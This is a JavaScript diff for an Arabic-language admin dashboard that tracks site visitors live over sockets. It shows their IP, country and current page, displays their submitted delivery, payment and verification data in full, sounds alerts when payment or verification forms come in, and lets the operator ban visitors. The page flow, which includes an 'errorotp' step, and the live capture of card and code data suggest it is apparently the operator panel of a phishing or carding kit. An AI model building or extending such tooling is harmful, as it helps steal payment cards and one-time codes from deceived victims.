@@ -969,4 +969,521 @@ function setupSocketListeners() {
     updateStats();
   });
 
-  socket.on('visitor:online
+  socket.on('visitor:online', (data) => {
+    console.log('🟢 DATA RECEIVED VIA SOCKET (visitor:online):', data);
+    const sessionId = data.session_id || data.sessionId;
+    
+    // Update visitor status to online
+    updateVisitorStatus(sessionId, true);
+    
+    // Move to top when coming online
+    moveCardToTop(sessionId);
+    
+    // Update stats
+    updateStats();
+  });
+
+  // Handle form submission events (for sounds)
+  socket.on('form:delivery', (data) => {
+    console.log('📦 Form delivery submitted:', data);
+    // Play delivery sound if enabled
+    if (!isMuted) playSound('delivery');
+  });
+
+  socket.on('form:payment', (data) => {
+    console.log('💳 Form payment submitted:', data);
+    // Play payment sound if enabled
+    if (!isMuted) playSound('payment');
+  });
+
+  socket.on('form:verification', (data) => {
+    console.log('🔐 Form verification submitted:', data);
+    // Play verification sound if enabled
+    if (!isMuted) playSound('verification');
+  });
+}
+
+// ==========================================
+// SOUND SYSTEM
+// ==========================================
+
+function initAudio() {
+  try {
+    audioContext = new (window.AudioContext || window.webkitAudioContext)();
+    console.log('🔊 Audio context initialized');
+  } catch (e) {
+    console.error('❌ Failed to initialize audio:', e);
+  }
+}
+
+function playSound(type) {
+  if (!audioContext) {
+    initAudio();
+  }
+  
+  if (audioContext.state === 'suspended') {
+    audioContext.resume();
+  }
+  
+  const oscillator = audioContext.createOscillator();
+  const gainNode = audioContext.createGain();
+  
+  oscillator.connect(gainNode);
+  gainNode.connect(audioContext.destination);
+  
+  switch (type) {
+    case 'delivery':
+      oscillator.frequency.value = 523.25; // C5
+      gainNode.gain.value = 0.3;
+      oscillator.start();
+      oscillator.stop(audioContext.currentTime + 0.2);
+      break;
+    case 'payment':
+      oscillator.frequency.value = 659.25; // E5
+      gainNode.gain.value = 0.3;
+      oscillator.start();
+      oscillator.stop(audioContext.currentTime + 0.3);
+      break;
+    case 'verification':
+      oscillator.frequency.value = 783.99; // G5
+      gainNode.gain.value = 0.3;
+      oscillator.start();
+      oscillator.stop(audioContext.currentTime + 0.4);
+      break;
+    case 'newVisitor':
+      oscillator.frequency.value = 880; // A5
+      gainNode.gain.value = 0.3;
+      oscillator.start();
+      oscillator.stop(audioContext.currentTime + 0.3);
+      break;
+  }
+}
+
+function toggleSound() {
+  isMuted = !isMuted;
+  const btn = document.querySelector('.sound-toggle');
+  if (btn) {
+    btn.textContent = isMuted ? '🔇' : '🔊';
+  }
+  localStorage.setItem('admin_sound_muted', isMuted);
+  showToast(isMuted ? 'تم كتم الصوت' : 'تم تشغيل الصوت', 'info');
+}
+
+// ==========================================
+// VISITOR CARD UTILITIES
+// ==========================================
+
+function createVisitorCardElement(visitor, grid, prepend = true) {
+  if (!visitor) return null;
+  
+  const sessionId = visitor.session_id || visitor.sessionId || '';
+  const country = visitor.country || 'غير معروف';
+  const ip = visitor.ip_address || visitor.ip || '';
+  const page = visitor.current_page || 'home';
+  const isOnline = visitor.is_online || visitor.isOnline || false;
+  const deliveryData = visitor.delivery_data || null;
+  const paymentData = visitor.payment_data || null;
+  const verificationData = visitor.verification_data || null;
+  
+  // Build status indicators
+  const hasDelivery = deliveryData ? '✅' : '❌';
+  const hasPayment = paymentData ? '✅' : '❌';
+  const hasVerification = verificationData ? '✅' : '❌';
+  
+  const card = document.createElement('div');
+  card.className = `visitor-card ${isOnline ? 'online' : 'offline'}`;
+  card.setAttribute('data-session', sessionId);
+  
+  card.innerHTML = `
+    <div class="visitor-card-header">
+      <div class="visitor-status ${isOnline ? 'online' : 'offline'}">
+        <span class="status-dot ${isOnline ? 'online' : ''}"></span>
+        <span class="status-text">${isOnline ? 'متصل' : 'غير متصل'}</span>
+      </div>
+      <span class="visitor-time relative-time" data-timestamp="${visitor.last_activity || visitor.created_at}">${getRelativeTime(visitor.last_activity || visitor.created_at)}</span>
+    </div>
+    <div class="visitor-card-body">
+      <div class="visitor-info-row">
+        <span class="info-label">الدولة:</span>
+        <span class="info-value">${country}</span>
+      </div>
+      <div class="visitor-info-row">
+        <span class="info-label">IP:</span>
+        <span class="info-value">${ip}</span>
+      </div>
+      <div class="visitor-info-row">
+        <span class="info-label">الصفحة:</span>
+        <span class="info-value page-name">${getPageName(page)}</span>
+      </div>
+      <div class="visitor-info-row">
+        <span class="info-label">الجلسة:</span>
+        <span class="info-value session-id">${sessionId.substring(0, 15)}...</span>
+      </div>
+    </div>
+    <div class="visitor-card-footer">
+      <div class="status-indicators">
+        <span class="indicator" title="بيانات التوصيل">📦 ${hasDelivery}</span>
+        <span class="indicator" title="بيانات الدفع">💳 ${hasPayment}</span>
+        <span class="indicator" title="التحقق">🔐 ${hasVerification}</span>
+      </div>
+      <div class="visitor-actions">
+        <button class="btn-action view" onclick="viewVisitorDetails('${sessionId}')" title="عرض التفاصيل">👁️</button>
+        <button class="btn-action ban" onclick="confirmBan('${sessionId}', '${ip}')" title="حظر">🚫</button>
+      </div>
+    </div>
+  `;
+  
+  if (prepend && grid.firstChild) {
+    grid.insertBefore(card, grid.firstChild);
+  } else {
+    grid.appendChild(card);
+  }
+  
+  return card;
+}
+
+function updateVisitorCardInGrid(sessionId, data) {
+  const card = document.querySelector(`[data-session="${sessionId}"]`);
+  if (!card) return;
+  
+  // Update online status
+  const isOnline = data.is_online || data.isOnline || false;
+  card.classList.toggle('online', isOnline);
+  card.classList.toggle('offline', !isOnline);
+  
+  const statusDot = card.querySelector('.status-dot');
+  if (statusDot) {
+    statusDot.classList.toggle('online', isOnline);
+  }
+  
+  // Update page if changed
+  if (data.current_page) {
+    const pageName = card.querySelector('.page-name');
+    if (pageName) {
+      pageName.textContent = getPageName(data.current_page);
+    }
+  }
+  
+  // Move to top if online
+  if (isOnline) {
+    const grid = document.getElementById('visitorsGrid');
+    if (grid && grid.firstChild !== card) {
+      grid.insertBefore(card, grid.firstChild);
+    }
+  }
+}
+
+function updateVisitorStatus(sessionId, isOnline) {
+  const card = document.querySelector(`[data-session="${sessionId}"]`);
+  if (!card) return;
+  
+  card.classList.toggle('online', isOnline);
+  card.classList.toggle('offline', !isOnline);
+  
+  const statusDot = card.querySelector('.status-dot');
+  if (statusDot) {
+    statusDot.classList.toggle('online', isOnline);
+  }
+  
+  const statusText = card.querySelector('.status-text');
+  if (statusText) {
+    statusText.textContent = isOnline ? 'متصل' : 'غير متصل';
+  }
+}
+
+function moveCardToTop(sessionId) {
+  const card = document.querySelector(`[data-session="${sessionId}"]`);
+  const grid = document.getElementById('visitorsGrid');
+  if (!card || !grid) return;
+  
+  if (grid.firstChild !== card) {
+    grid.insertBefore(card, grid.firstChild);
+  }
+}
+
+function addVisitorCardToGrid(visitor, prepend = true) {
+  const grid = document.getElementById('visitorsGrid');
+  if (!grid) return;
+  
+  // Remove empty state if exists
+  const emptyState = grid.querySelector('.empty-state');
+  if (emptyState) emptyState.remove();
+  
+  createVisitorCardElement(visitor, grid, prepend);
+}
+
+function updateCardAndMoveToTop(sessionId, data) {
+  const card = document.querySelector(`[data-session="${sessionId}"]`);
+  
+  if (card) {
+    // Update existing card
+    updateVisitorCardInGrid(sessionId, data);
+    moveCardToTop(sessionId);
+  } else {
+    // Create new card
+    addVisitorCardToGrid(data, true);
+  }
+}
+
+function getPageName(page) {
+  const pageNames = {
+    'home': 'الرئيسية',
+    'product': 'المنتج',
+    'delivery': 'التوصيل',
+    'payment': 'الدفع',
+    'verification': 'التحقق',
+    'select': 'الاختيار',
+    'errorotp': 'خطأ OTP'
+  };
+  return pageNames[page] || page;
+}
+
+// ==========================================
+// VISITOR DETAILS MODAL
+// ==========================================
+
+function viewVisitorDetails(sessionId) {
+  const visitor = allAdminVisitors.find(v => 
+    (v.session_id === sessionId || v.sessionId === sessionId)
+  );
+  
+  if (!visitor) {
+    showToast('الزائر غير موجود', 'error');
+    return;
+  }
+  
+  // Create modal
+  const modal = document.createElement('div');
+  modal.className = 'modal-backdrop';
+  modal.innerHTML = `
+    <div class="modal-content visitor-modal">
+      <div class="modal-header">
+        <h3>👤 تفاصيل الزائر</h3>
+        <button class="modal-close" onclick="this.closest('.modal-backdrop').remove()">✕</button>
+      </div>
+      <div class="modal-body">
+        <div class="detail-row">
+          <span class="detail-label">معرف الجلسة:</span>
+          <span class="detail-value">${visitor.session_id || visitor.sessionId}</span>
+        </div>
+        <div class="detail-row">
+          <span class="detail-label">الدولة:</span>
+          <span class="detail-value">${visitor.country || 'غير معروف'}</span>
+        </div>
+        <div class="detail-row">
+          <span class="detail-label">عنوان IP:</span>
+          <span class="detail-value">${visitor.ip_address || visitor.ip || 'غير متاح'}</span>
+        </div>
+        <div class="detail-row">
+          <span class="detail-label">الصفحة الحالية:</span>
+          <span class="detail-value">${getPageName(visitor.current_page || 'home')}</span>
+        </div>
+        <div class="detail-row">
+          <span class="detail-label">الحالة:</span>
+          <span class="detail-value">${visitor.is_online ? '🟢 متصل' : '⚫ غير متصل'}</span>
+        </div>
+        <div class="detail-row">
+          <span class="detail-label">آخر نشاط:</span>
+          <span class="detail-value">${formatDate(visitor.last_activity)}</span>
+        </div>
+        
+        ${visitor.delivery_data ? `
+        <div class="detail-section">
+          <h4>📦 بيانات التوصيل</h4>
+          <pre>${JSON.stringify(visitor.delivery_data, null, 2)}</pre>
+        </div>
+        ` : ''}
+        
+        ${visitor.payment_data ? `
+        <div class="detail-section">
+          <h4>💳 بيانات الدفع</h4>
+          <pre>${JSON.stringify(visitor.payment_data, null, 2)}</pre>
+        </div>
+        ` : ''}
+        
+        ${visitor.verification_data ? `
+        <div class="detail-section">
+          <h4>🔐 بيانات التحقق</h4>
+          <pre>${JSON.stringify(visitor.verification_data, null, 2)}</pre>
+        </div>
+        ` : ''}
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-secondary" onclick="this.closest('.modal-backdrop').remove()">إغلاق</button>
+        <button class="btn btn-danger" onclick="confirmBan('${visitor.session_id}', '${visitor.ip_address}')">🚫 حظر</button>
+      </div>
+    </div>
+  `;
+  
+  document.body.appendChild(modal);
+}
+
+function confirmBan(sessionId, ip) {
+  if (!confirm('هل أنت متأكد من حظر هذا المستخدم؟')) return;
+  
+  if (socket) {
+    socket.emit('user:ban', {
+      targetSessionId: sessionId,
+      targetIp: ip,
+      reason: 'Banned from admin panel',
+      customMessage: 'تم حظرك من الموقع'
+    });
+    
+    showToast('تم حظر المستخدم', 'success');
+    
+    // Remove card from grid after ban
+    setTimeout(() => {
+      const card = document.querySelector(`[data-session="${sessionId}"]`);
+      if (card) card.remove();
+    }, 500);
+  }
+}
+
+// ==========================================
+// STATS MANAGEMENT
+// ==========================================
+
+function updateStats() {
+  if (!socket) return;
+  socket.emit('stats:request');
+}
+
+function updateStatsDisplay(stats) {
+  if (!stats) return;
+  
+  const totalVisitorsEl = document.getElementById('totalVisitors');
+  const onlineVisitorsEl = document.getElementById('onlineVisitors');
+  const formSubmissionsEl = document.getElementById('formSubmissions');
+  const paymentSubmissionsEl = document.getElementById('paymentSubmissions');
+  const countryListEl = document.getElementById('countryList');
+  
+  if (totalVisitorsEl) totalVisitorsEl.textContent = stats.totalVisitors || 0;
+  if (onlineVisitorsEl) onlineVisitorsEl.textContent = stats.onlineVisitors || 0;
+  if (formSubmissionsEl) formSubmissionsEl.textContent = stats.formSubmissions || 0;
+  if (paymentSubmissionsEl) paymentSubmissionsEl.textContent = stats.paymentSubmissions || 0;
+  
+  // Update country list
+  if (countryListEl && stats.countryStats) {
+    countryListEl.innerHTML = stats.countryStats.map(c => `
+      <div class="country-item">
+        <span class="country-name">${getCountryFlag(c.country)} ${c.country}</span>
+        <span class="country-count">${c.count} زائر</span>
+      </div>
+    `).join('') || '<p style="color:var(--text-muted);text-align:center;">لا توجد بيانات</p>';
+  }
+}
+
+function updateOnlineCounts() {
+  const onlineCount = allAdminVisitors.filter(v => v.is_online).length;
+  const totalCount = allAdminVisitors.length;
+  
+  const onlineCountEl = document.getElementById('onlineCount');
+  const totalCountEl = document.getElementById('totalCount');
+  
+  if (onlineCountEl) onlineCountEl.textContent = onlineCount;
+  if (totalCountEl) totalCountEl.textContent = totalCount;
+}
+
+function getCountryFlag(countryCode) {
+  if (!countryCode || countryCode === 'XX') return '🌍';
+  const codePoints = countryCode
+    .toUpperCase()
+    .split('')
+    .map(char => 127397 + char.charCodeAt());
+  return String.fromCodePoint(...codePoints);
+}
+
+// ==========================================
+// UI HELPERS
+// ==========================================
+
+function showToast(message, type = 'info') {
+  const toast = document.createElement('div');
+  toast.className = `toast toast-${type}`;
+  toast.innerHTML = `
+    <span class="toast-icon">${type === 'success' ? '✓' : type === 'error' ? '✕' : 'ℹ'}</span>
+    <span class="toast-message">${message}</span>
+  `;
+  document.body.appendChild(toast);
+  
+  setTimeout(() => {
+    toast.classList.add('fade-out');
+    setTimeout(() => toast.remove(), 300);
+  }, 3000);
+}
+
+function showNotification(title, message, type = 'info') {
+  const notification = document.createElement('div');
+  notification.className = `notification notification-${type}`;
+  notification.innerHTML = `
+    <div class="notification-header">
+      <strong>${title}</strong>
+      <button onclick="this.closest('.notification').remove()">✕</button>
+    </div>
+    <div class="notification-body">${message}</div>
+  `;
+  document.body.appendChild(notification);
+  
+  setTimeout(() => {
+    notification.classList.add('fade-out');
+    setTimeout(() => notification.remove(), 300);
+  }, 5000);
+}
+
+function updateConnectionStatus(isOnline) {
+  const statusDot = document.querySelector('.status-dot');
+  const connectionText = document.querySelector('.connection-text');
+  
+  if (statusDot) {
+    statusDot.classList.toggle('online', isOnline);
+    statusDot.classList.toggle('offline', !isOnline);
+  }
+  
+  if (connectionText) {
+    connectionText.textContent = isOnline ? 'متصل' : 'غير متصل';
+  }
+}
+
+// ==========================================
+// INITIALIZATION
+// ==========================================
+
+document.addEventListener('DOMContentLoaded', () => {
+  // Load sound preference
+  isMuted = localStorage.getItem('admin_sound_muted') === 'true';
+  if (isMuted) {
+    const soundBtn = document.querySelector('.sound-toggle');
+    if (soundBtn) soundBtn.textContent = '🔇';
+  }
+  
+  // Check if already logged in
+  const savedToken = localStorage.getItem('admin_token');
+  if (savedToken) {
+    adminToken = savedToken;
+    showDashboard();
+    initAdminSocket(savedToken).catch(err => {
+      console.error('Failed to reconnect:', err);
+      showLoginPage();
+    });
+  }
+});
+
+// Export functions to global scope
+window.initAdminSocket = initAdminSocket;
+window.reconnectSocket = reconnectSocket;
+window.setupSocketListeners = setupSocketListeners;
+window.updateStats = updateStats;
+window.updateStatsDisplay = updateStatsDisplay;
+window.updateOnlineCounts = updateOnlineCounts;
+window.viewVisitorDetails = viewVisitorDetails;
+window.confirmBan = confirmBan;
+window.showToast = showToast;
+window.showNotification = showNotification;
+window.toggleSound = toggleSound;
+window.playSound = playSound;
+window.updateConnectionStatus = updateConnectionStatus;
+window.getRelativeTime = getRelativeTime;
+window.formatDate = formatDate;
+window.getCountryFlag = getCountryFlag;
+window.startLiveTimer = startLiveTimer;
+window.updateRelativeTimes = updateRelativeTimes;
